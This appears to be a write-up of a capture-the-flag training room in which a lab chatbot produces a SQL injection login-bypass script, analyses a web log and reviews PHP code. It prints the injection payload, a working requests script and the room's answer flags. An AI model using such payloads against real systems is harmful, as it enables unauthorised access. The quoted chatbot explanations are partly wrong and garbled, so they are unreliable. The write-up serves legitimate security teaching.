## Introduction

---
#### The Story

The lights glimmer and servers hum blissfully at The Best Festival Company (TBFC), melting the snow surrounding the data centre. TBFC has continued its pursuit of AI excellence. After the past two years, they realise that Van Chatty, their in-house chatbot, wasn’t quite meeting their standards. 

Unfortunately for the elves at TBFC, they are also not immune to performance metrics. The elves aim to find ways of increasing their velocity; something to manage the tedious, distracting tasks, which allows the elves to do the real magic. 

TBFC, adventurous as ever, is trialling their brand new cyber security AI assistant, Van SolveIT, which is capable of helping the elves with all their defensive, offensive, and software needs. They decide to put this flashy technology to use as Christmas approaches, to identify, confirm, and resolve any potential vulnerabilities, before any nay-sayers can.

#### Learning Objectives

- How AI can be used as an assistant in cyber security for a variety of roles, domains and tasks
- Using an AI assistant to solve various tasks within cyber security
- Some of the considerations, particularly in cyber security, surrounding the use of AI

---

## Walkthrough

01
02
03
and so on 



The Boom of AI Assistants
Ah, yes, artificial intelligence, that buzzword that seems here to stay. Who would have thought? Today’s room will highlight some ways AI is utilised in cyber security, along with important considerations to bear in mind when deploying AI for such tasks.

Particularly at the time of writing, AI is increasingly seen as a tool to boost speed by handling often tedious, time-consuming tasks, allowing humans to perform the real magic. Organisations want to see experience, not avoidance, in how these tools are operated.

GPT this, GPT that, we’ve all heard it often. And it’s likely to persist. As AI’s capabilities expand daily, we’ve observed a shift from AI being just “something to ask because you were too lazy to Google” (a mistake I’ve made myself). Now, AI is being embedded into everyday workflows, transforming how tasks are done and boosting productivity like never before. 

With that said, let’s begin today’s room!

a christmas bauble ornament with an AI robot sitting inside of it.

AI in Cyber Security
The use of artificial intelligence has seen a significant boost in cyber security. Visit almost any vendor, and they'll now have some form of AI powering a solution somewhere. Why? Well, it's not just because they're capitalising on the buzzword (although that's certainly a part of it), but rather, the benefits from artificial intelligence really do apply here. Let's explore some of these in the table below:

Features of AI	Cyber Security Relevance
Processing large amounts of data	Analysing vast data from multiple types of sources. For example, system and network logs together.
Behaviour analysis	Tracking normal behaviour and activities over a period of time and flagging anything that is out of the ordinary.
Generative AI	Summarising or providing context behind a series of events.
Defensive Security
a piece of paper on a clipboard with a magnifying glass inspecting it.

AI agents are being used in blue teaming to speed up detection, investigation, and response, making them quicker and more dependable. Acting like automated assistants, these agents continuously process telemetry (logs, network flows, endpoint signals) and add context to alerts. Furthermore, we are witnessing the integration of AI into vendor appliances—such as AI-assisted firewalling and intrusion detection systems.

Beyond just detecting threats, AI can also assist in automating responses. Picture your system automatically isolating an infected device, blocking a suspicious email, or flagging an unusual login attempt — all in real time.

Offensive Security
AI agents have made a notable impact on offensive security by automating and handling the often very labourious and time-consuming tasks that a pentester might traditionally undertake. 

For example, AI can be a powerful tool in a penetration tester's workflow for reconnaissance and information gathering, from OSINT to analysing noisy scanner outputs and mapping attack surfaces. This allows the pentester to spend more time on the crucial tasks that require a human touch.

Software
three gears/cogs closely placed with one another.

AI-driven software development, rightfully, sounds a bit frightening. Isn't that so? Well, you wouldn't be wrong to feel this way; we've all heard about the popularity of vibe coding and the vulnerabilities introduced by AI.

However, AI has proven to be a valuable addition to the software development process in several ways. One example is a virtual "colleague" to bounce ideas off while writing the code itself. More importantly, it is used as a SAST/DAST scanner. These scanners audit and analyse written code and applications for potential vulnerabilities. 

Yes, it's somewhat ironic. AI agents can be great at identifying vulnerabilities, but are not quite as effective at writing secure code.

Considerations of AI In Cyber Security
a red closed book with the text "rules" on the cover.

Now, I’m not entirely here to sing the praises of AI and say it’s the silver bullet to all your needs. If you’ve used AI before, you’ll know the pitfalls and frustrations one can face. And nowhere is that truer than in cyber security.

While the usual considerations of using AI apply, such as not owning the output from AI, there are specific factors to consider before deploying it in cyber security.

One such consideration is the use of AI in activities like offensive penetration testing. While we have discussed some of AI's applications in these areas, caution remains essential. You do not want to explain to a client that their services and websites are down because an AI has caused a race condition or overwhelmed their systems.

We must think carefully about the data AI learns from, how transparent and fair its decisions are, and how reliable it remains when the unexpected occurs. We cannot assume the output from AI is 100% correct. Efforts must be made to verify the information it provides. Additionally, managing challenges such as keeping data private, securing AI models, and informing users properly requires careful consideration.

Practical
Phew! Ready for an exciting exercise? You will be interacting with Van SolveIT, who will guide you through three showcases of how AI can be used in cyber security:

Red: Generate and use an exploit script.
Blue: Analyse web logs of an attack that has occurred.
Software: Analyse source code for vulnerabilities.
When you're ready, you can access Van SolveIT at http://MACHINE_IP. Remember, you will need to do so either from the AttackBox or your own device connected to the VPN.

If you are on a small display, we recommend expanding the AttackBox into full screen mode which can be done by pressing the "two arrows" icon (left of the "+" icon) in the split-screen view to expand it into full screen.

Usage Tips
Chatbot responses may appear blank for a minute or two while it generates the reply. You will start to see Van SolveIT's responses in real time.
If the chatbot gets confused at any time, press the Restart Chat button at the top right of the page.
As you progress throughout the showcase, stages will unlock. You can go back to any stage that you have unlocked by clicking on the stage name on the top left.


---

## Objectives 

Complete the AI showcase by progressing through all of the stages. What is the flag presented to you?

Access Van SolveIT at http://10.49.142.222

Stage 1: Introduction

<img width="1061" height="829" alt="image" src="https://github.com/user-attachments/assets/2debdc01-d23d-4443-96f0-5defcfc1fa64" />

press the blue 'Complete Stage to Continue' button

Stage 2: Read Team

<img width="1352" height="857" alt="image" src="https://github.com/user-attachments/assets/ede23b60-9aaa-4b6a-8f76-f1cdfd4a452e" />

Prompt: Create python script exploit for a vulnerable website hosted at 10.49.142.222.5000

<img width="1356" height="805" alt="image" src="https://github.com/user-attachments/assets/510ed8b0-73a7-453a-971e-0f0d74ff4b71" />

Response:

```
AI Assistant

HOW TO SAVE THE FILE
1) Open your terminal or visual editor (e.g., Sublime Text).
2) Use the command nano script.py to create the file.
3) Paste the following code into the file:

import sys

def main():
    # This script exploits the SQL injection vulnerability by injecting "alice' OR 1=1 -- -"
    # Replace "alice' OR 1=1 -- -" with your actual SQL query
    username = input("Enter your username: ")
    print(f"Username: {username}")
    sys.exit()

if __name__ == "__main__":
    main()


4) Save the file with Ctrl + O and exit using Ctrl + X.
5) Run the script using python3 script.py to execute the exploit.

The script will prompt the user for their username and display it. This demonstrates how to exploit the vulnerability using Python.
```

```
AI Assistant

import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://10.49.142.222.5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```

Stage 3: Blue Team

<img width="1355" height="851" alt="image" src="https://github.com/user-attachments/assets/72b49748-5c74-4967-bc13-e7b8403cc2ed" />


Prompt: Analyze the logs of a vulnerable website hosted at 10.49.142.222.5000 give the passwords and the usernames


```
AI Assistant

Log Entry:
10.49.142.222 5000 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"

---

### Analysis of the Logs
1. IP Address: The user\u2019s IP is 10.49.142.222, indicating they are a potential attacker.
2. Time and Date: The attack occurred at 09:03 on October 3, 2025, around 10:00 AM.
3. URL: The URL accessed was /login.php, a common endpoint for user authentication.
4. Username Attempted: The username was "alice", and an SQL injection attempt was detected in the password parameter.
5. SQL Injection: The log shows the username being hashed with the malicious string alice%27+OR+1%3D1+--+-&password=test, which is a classic SQL injection attack.

---
AI Assistant

### Useful for a Blue Team Perspective
- Detecting Vulnerabilities: This log entry highlights a potential weakness in the application, indicating that the system could be vulnerable to SQL injection attacks.
- Early Detection: Identifying such vulnerabilities allows the team to prioritize security measures, such as implementing input validation, using SQL parsers, or updating the application.

---

Next Steps:
If you have any questions or need further assistance, feel free to ask! \U0001f4dd
Stage to Continue: Complete Stage to Continue.
```

```
198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"

```

Stage 4: Software

<img width="1346" height="852" alt="image" src="https://github.com/user-attachments/assets/bc0c0042-7452-4751-a3f6-f3ebeb078a4c" />

Prompt: 

Help me review the source code of a vulnerable website hosted at 10.49.142.222.5000. Identify the vulnerabilities in the source code

```

AI Assistant

php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';

FORMATTING GUIDELINES:
- When reviewing the PHP code snippet, in your response, show the whole snippet of the code, not just explain the vulnerability.
- Please format your answer when providing the PHP code snippet to use triple backticks (not single backticks)



1. Identification of the specific vulnerability
The code initializes two variables with ??, which sets them to empty strings. This means that if the POST data contains malicious input (like SQL injection), the variables are not sanitized, allowing an attacker to inject malicious SQL code.

2. Explanation of why the code is vulnerable
This code is vulnerable to SQL injection because the input variables are not sanitized. If an attacker inputs a username or password, the ?? operator sets them to empty, which could be used to construct a query. For example, an attacker could input a query like SELECT * FROM users WHERE username = 'admin' to steal user data.

3. Best practices for preventing similar issues
- Use prepared statements or parameterized queries to prevent SQL injection.
- Sanitize all user inputs (e.g., using htmlspecialchars or similar functions).
- Avoid using ?? in place of proper sanitization.
- Use secure database connections (e.g., mysqli or PDO) to prevent SQL injection attacks.

4. Tools and techniques for code security testing
- Use tools like OWASP ZAP or Burp Suite for SQL injection testing.
- Implement input validation and sanitization.
- Regularly update code to patch vulnerabilities.

5. Complete Showcase!
If you're ready to move on, please click "Complete Showcase!"!

```

<img width="1355" height="852" alt="image" src="https://github.com/user-attachments/assets/b0ffc507-7c3a-4f79-ad61-9377d73ad195" />

THM{AI_MANIA}



---

Execute the exploit provided by the red team agent against the vulnerable web application hosted at MACHINE_IP:5000. What flag is provided in the script's output after it?
Remember, you will need to update the IP address placeholder in the script with the IP of your vulnerable machine (MACHINE_IP:5000)


<img width="1356" height="850" alt="image" src="https://github.com/user-attachments/assets/b876ab63-d771-4bf7-abcf-a780f378ef8d" />


alice' OR 1=1 -- -

test

<img width="1348" height="855" alt="image" src="https://github.com/user-attachments/assets/20f86b30-7df1-4b15-8895-21a7a14184a5" />


<img width="1348" height="850" alt="image" src="https://github.com/user-attachments/assets/9ddea3f1-6f58-4f6a-9e80-5277ca6b7f6b" />

THM{SQLI_EXPLOIT}


---

## Key Takeaways

---

Reflection

